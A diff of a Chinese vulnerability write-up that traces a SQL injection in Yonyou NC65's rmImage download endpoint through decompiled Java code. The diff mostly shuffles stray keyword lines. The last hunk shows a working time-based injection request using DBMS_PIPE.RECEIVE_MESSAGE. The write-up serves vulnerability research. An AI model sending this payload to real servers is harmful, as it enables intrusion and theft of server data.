@@ -8,6 +8,8 @@ asset_dir: embedded-base64
 
 [用友](https://mrxn.net/tag/%E7%94%A8%E5%8F%8B "用友")NC系统可利用/portal/pt/rmImage/download接口中的 pk\_psndoc 参数实现sql注入，从而窃取服务器的敏感信息。
 
+编程
+
 # 影响版本
 
 NC65
@@ -24,17 +26,9 @@ NC65
 
 因此搜索 rmImage 方法的实现部分即可定位文件
 
-编程
+漏洞利用分析
 
 nc/bs/hrss/pub/action/RMImageAction.class
-
-深入探索
-
-文本剥离工具
-
-在线安全工具
-
-安全研究工具
 
 ```
 package nc.bs.hrss.pub.action;
@@ -153,7 +147,7 @@ public class RMImageAction extends BaseAction {
 
 pk\_psndoc 参数直接代入 queryAggRMPsndocVO 函数，其实现逻辑如下
 
-代码安全审计
+网络
 
 ```
 private AggregatedValueObject queryAggRMPsndocVO(String pk_psndoc) {
@@ -173,8 +167,6 @@ private AggregatedValueObject queryAggRMPsndocVO(String pk_psndoc) {
 
 继续代入 psndocQryServ.queryByPK 函数，其实现逻辑如下
 
-漏洞修复方案
-
 ```
 public AggRMPsndocVO queryByPK(String pk_psndoc) throws BusinessException {
     return (AggRMPsndocVO)this.getServiceTemplate().queryByPk(AggRMPsndocVO.class, pk_psndoc);
@@ -182,6 +174,8 @@ public AggRMPsndocVO queryByPK(String pk_psndoc) throws BusinessException {
 ```
 
 继续跟踪 getServiceTemplate().queryByPk 函数，这里注意 传入的第三个参数为 false
+
+编程
 
 ```
 public <T> T queryByPk(Class<T> clazz, String pk) throws BusinessException {
@@ -198,8 +192,6 @@ public <T> T queryByPk(Class<T> clazz, String pk, boolean lazyLoad2) throws Busi
 ```
 
 继续跟踪 getMDQueryService().queryBillOfVOByPK 函数
-
-计算机服务器
 
 ```
 public <T> T queryBillOfVOByPK(Class<T> voClass, String billPK, boolean bLazyLoad) throws MetaDataException {
@@ -221,8 +213,6 @@ public Object queryBillOfVOByPK(Class voClass, String billPK, boolean bLazyLoad)
 ```
 
 billPK 继续代入 queryBillImp 函数
-
-SQL注入防护
 
 ```
 protected NCObject queryBillImp(String billPK, boolean bLazyLoad) throws MetaDataException {
@@ -248,8 +238,6 @@ protected NCObject queryBillImp(String billPK, boolean bLazyLoad) throws MetaDat
 ```
 
 继续跟踪 retrieveByPK 函数
-
-搜索引擎
 
 ```
 public Object retrieveByPK(String pkValue, boolean ignoreDrEqual1) throws MetaDataException {
@@ -299,7 +287,7 @@ Host: nc65.mrxn.net
 
 漏洞利用示例
 
-漏洞修复方案
+漏洞利用分析
 
 ```
 GET /portal/pt/rmImage/download?pageId=login&pk_psndoc=1'+and+1=DBMS_PIPE.RECEIVE_MESSAGE('RDS',6)-- HTTP/1.1
